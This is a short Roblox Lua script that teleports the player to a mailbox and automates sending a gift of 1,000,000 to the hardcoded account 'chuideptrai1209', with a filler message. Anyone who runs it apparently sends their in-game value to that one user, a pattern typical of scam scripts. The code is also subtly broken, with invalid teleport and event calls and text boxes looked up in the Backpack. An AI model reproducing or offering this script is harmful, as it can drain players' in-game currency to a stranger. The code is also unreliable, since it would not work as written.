-- Teleport to the specified coordinates
game.Players.LocalPlayer:Teleport(143.34673614500, 23.6020991104125977, -349.0367736816406)

-- Wait for the player to click the "Send" button
game.Players.LocalPlayer:WaitForChild("Humanoid").SeatPart.Touched:Connect(function(hit)
    -- Check if the player clicked on the "Send" button
    if hit.Parent.Name == "Mailbox" and hit.Parent:FindFirstChild("SendButton") then
        -- Click the "Send" button
        hit.Parent.SendButton.MouseButton1Click:FireServer()

        -- Wait for the "Write a message" text box to appear
        local messageBox = game.Players.LocalPlayer:WaitForChild("Backpack"):FindFirstChild("MessageBox")

        -- Set the "Write a message" text box to "aaaaaaaaa"
        messageBox.Text = "aaaaaaaaa"

        -- Wait for the "Send for" text box to appear
        local sendForBox = game.Players.LocalPlayer:WaitForChild("Backpack"):FindFirstChild("Amount")

        -- Set the "Send for" text box to "1000000"
        sendForBox.Text = "1000000"

        -- Wait for the "Roblox Username" text box to appear
        local usernameBox = game.Players.LocalPlayer:WaitForChild("Backpack"):FindFirstChild("Recipient")

        -- Set the "Roblox Username" text box to "chuideptrai1209"
        usernameBox.Text = "chuideptrai1209"

        -- Click the "Send" button again to send the gift
        hit.Parent.SendButton.MouseButton1Click:FireServer()
    end
end)
